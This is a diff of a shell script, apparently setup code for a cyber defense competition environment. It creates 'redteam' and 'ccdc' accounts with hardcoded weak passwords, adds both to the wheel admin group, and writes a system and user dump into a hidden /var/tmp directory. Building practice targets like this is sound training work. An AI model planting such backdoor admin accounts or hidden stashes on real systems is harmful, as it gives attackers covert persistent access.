@@ -18,13 +18,13 @@ backup() {
 users() {
     if ! grep -q "redteam" /etc/passwd; then
         pw useradd redteam -c "do not remove" -s /bin/sh -m
-        echo "letredin" | passwd --stdin redteam
+        echo "letredin" | passwd redteam --stdin
         pw groupmod wheel -m redteam
     fi
     
     if ! grep -q "ccdc" /etc/passwd; then
         pw useradd ccdc -c "ccdc" -s /bin/sh -m
-        echo "password123" | passwd --stdin ccdc
+        echo "password123" | passwd ccdc --stdin
         pw groupmod wheel -m ccdc
     fi
 }
@@ -139,7 +139,7 @@ DMZ: 10.0.1.0/24
 External IP: 203.0.113.10
 EOF
     
-    cat > /var/tmp/.redteam/system_dump.log << 'EOF'
+    cat > /var/tmp/.redteam_dont_look/system_dump.log << 'EOF'
 System Information Dump - $(date)
 Hostname: $(hostname)
 Users: $(cat /etc/passwd | cut -d: -f1 | tr '\n' ' ')
